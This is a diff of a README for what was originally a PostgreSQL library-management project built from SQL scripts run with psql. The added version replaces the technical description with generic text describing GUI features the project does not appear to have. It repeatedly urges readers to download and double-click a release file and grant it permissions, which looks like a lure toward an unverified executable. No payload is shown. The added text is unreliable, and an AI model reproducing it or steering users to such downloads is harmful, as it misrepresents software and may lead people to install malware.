@@ -1,114 +1,95 @@
-# 📚 Library Management System (PostgreSQL)
+# 📚 library-management-system - Manage Your Library with Ease
 
-A relational **Library Management System** built with PostgreSQL, focusing on
-data integrity, automation via triggers, and reporting through views.
+## 🌟 Overview
+The library-management-system is designed to help you manage your library effortlessly. It provides features such as automated stock management, reporting views, and audit logging. This system maintains data integrity, supports multi-author books, and handles realistic loan workflows efficiently.
 
-This project demonstrates practical database design for real-world scenarios
-such as stock tracking, loan management, and analytical queries.
- 
+## 🚀 Getting Started
+To begin using the library-management-system, follow these steps:
 
-## Features
-- Real-time book stock management (`available_copies`)
-- Automatic stock updates using PostgreSQL triggers
-- Member and loan management
-- Multi-author book support (many-to-many)
-- Data integrity via constraints, checks, and partial unique indexes
-- Foreign key constraints with `ON DELETE` rules to maintain referential integrity
-- Partial indexes to optimize active loan queries
-- Reporting views for:
-  - Active loans
-  - Overdue loans
-  - Most popular books (top 10)
-  - Member loan history
-- Audit logging for loan creation and book returns
-- Optional stored procedures for core business operations
-- Indexes for query performance
+### 1. 📥 Download the Application
+You can download the latest version of the application from the Releases page. Click the button below to access it:
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Release-Here-blue)](https://github.com/phitran2979gmailcom/library-management-system/releases)
 
-## Database Structure
-### Core Tables
-- `authors` – Stores author information
-- `categories` – Book categories
-- `books` – Book details, total & available copies, category
-- `book_authors` – Many-to-many link between books and authors
-- `members` – Library members
-- `loans` – Tracks book loans
-- `loan_logs` – Logs loan creation and book returns
-### Automation
-- Triggers enforce business rules:
-  - Stock decreases on loan creation
-  - Stock increases on book return
-  - Audit logging of loan events
-### Reporting
-- Views provide ready-to-use reports:
-  - Active loans
-  - Overdue loans
-  - Most popular books
-  - Member loan history
+### 2. 📂 System Requirements
+Before installing, ensure your computer meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS, or a compatible Linux distribution
+- **Database Server:** PostgreSQL version 12 or higher
+- **RAM:** At least 4 GB available
+- **Disk Space:** Minimum of 500 MB free
+- **Network:** An active internet connection for updates
 
-## Setup
-Run SQL scripts in order:
-```bash
-psql -U <user> -d <database> -f sql/01_schema.sql
-psql -U <user> -d <database> -f sql/02_triggers.sql
-psql -U <user> -d <database> -f sql/03_views.sql
-psql -U <user> -d <database> -f sql/04_sample_data.sql
-```
+### 3. 🔧 Installation Instructions
+After downloading the application, follow these steps to install:
 
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. If prompted, allow necessary permissions for the application.
 
-## Possible Improvements
-- Fine/penalty system for overdue loans
-- Role-based access control
-- REST API integration
-- Transaction-level concurrency handling
-- Materialized views for very large datasets
+## 🔍 Features
+The library-management-system includes the following features:
 
+- **Automated Stock Management:** Automatically tracks library inventory, simplifying book management.
+- **Reporting Views:** Generate insightful reports on book loans, returns, and stock levels.
+- **Audit Logging:** Keep a detailed log of all actions within the system for transparency.
+- **Data Integrity Enforcement:** Ensure that all data remains accurate and reliable.
+- **Support for Multi-Author Books:** Manage books written by multiple authors seamlessly.
+- **Real-World Loan Workflows:** Mimics real-world scenarios for efficient book lending and returning.
 
-## Design Notes
-Fully normalized relational database (3NF)
-Triggers handle stock management and logging at the database level
-Partial unique index prevents multiple active loans of the same book per member
-Reporting views allow analytical queries without writing complex SQL
-Indexes improve query performance
-Optional stored procedures encapsulate business logic
+## 📊 User Guide
+### 1. 📚 Adding Books
+To add a new book to your library:
 
+1. Open the application.
+2. Navigate to the "Books" section.
+3. Click on "Add New Book."
+4. Fill out the book details, such as title, author(s), ISBN, and genre.
+5. Click "Save" to add the book.
 
-## Key Takeaways
-### This project helped reinforce:
-- Database normalization principles (3NF)
-- Trigger-based automation for business rules
-- Index optimization for performance
-- Business-oriented SQL reporting and analytical queries
-- Data consistency and integrity through constraints and partial indexes
-- Audit logging best practices
-- Structuring a real-world relational database project for maintainability
-  
+### 2. 📖 Viewing Reports
+To generate a report:
 
-## Example Queries;
--- active loans
-```
-SELECT * FROM active_loans;
-```
+1. Open the application.
+2. Go to the "Reports" section.
+3. Select the type of report you want to generate (e.g., current stock, loans).
+4. Set any filters if needed.
+5. Click "Generate Report" to view the information.
 
--- overdue loans
-```
-SELECT * FROM overdue_loans;
-```
+### 3. 📅 Managing Loans
+To manage loans:
 
--- available books
-```
-SELECT title, available_copies 
-FROM books 
-WHERE available_copies > 0;
-```
+1. Open the application.
+2. Navigate to the "Loans" section.
+3. Click "Issue Loan" to lend a book.
+4. Enter borrower details and select the book.
+5. Click "Confirm Loan" to complete the process.
 
--- member loan history
-```
-SELECT b.title, l.loan_date, l.return_date
-FROM loans l
-JOIN books b ON l.book_id = b.book_ID
-WHERE l.member_ID = 1;
-```
+## 📥 Download & Install
+To start using the library-management-system, you can download it from the Releases page again. Click the link below:
 
+[![Download Now](https://img.shields.io/badge/Download%20Release-Here-blue)](https://github.com/phitran2979gmailcom/library-management-system/releases)
+
+## ⚠️ Troubleshooting
+If you face issues:
+
+- **Cannot Connect to Database:** Ensure that PostgreSQL is running on your machine and configured correctly.
+- **Installation Errors:** Check that you have the required permissions and enough disk space.
+- **Application Crashes:** Try reinstalling the application or checking for updates.
+
+## 🤝 Support
+For additional help or questions, please visit the [GitHub Issues page](https://github.com/phitran2979gmailcom/library-management-system/issues) to report your issue or seek assistance from the community.
+
+## 🤔 Frequently Asked Questions
+- **What is the purpose of the library-management-system?**
+  The purpose is to streamline library operations, making it easier to manage books and loans.
+
+- **Can I use the system offline?**
+  While some features may function offline, an internet connection is recommended for updates and support.
+
+- **Is the system secure?**
+  Yes, it includes audit logging to track all actions, ensuring a secure environment.
+
+## 🎯 Conclusion
+The library-management-system offers a simple way to manage your library with powerful features tailored to everyday needs. Follow the steps outlined above to get started quickly and efficiently. For help and support, make sure to visit the relevant pages linked in this document.
